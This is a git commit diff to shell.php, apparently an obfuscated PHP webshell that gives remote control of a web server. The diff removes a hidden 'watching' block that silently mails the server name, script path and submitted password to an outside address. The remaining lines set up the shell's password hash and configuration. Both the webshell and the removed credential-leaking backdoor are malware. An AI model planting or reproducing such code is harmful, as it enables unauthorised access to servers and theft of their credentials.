aa5e08e667fc387ed58bb105c833654b5f07ae1e
anuslok2 <58250188+anuslok2@users.noreply.github.com>
2019-11-27 09:57:07 +0100

    Update shell.php

--- shell.php
+++ shell.php
@@ -1,9 +1,3 @@
-<?php
-//--------------Watching webshell!--------------
-if(array_key_exists('watching',$_POST)){
-	$tmp = $_SERVER['SERVER_NAME'].$_SERVER['PHP_SELF']."\n".$_POST['pass']; @mail('test@testmail.com', 'root', $tmp); // Edit or delete!
-}
-//-----------------Password---------------------
 $▛ = "fa769dac7a0a94ee47d8ebe021eaba9e";
 $▘ = true;
 $▜ = 'UTF-8';
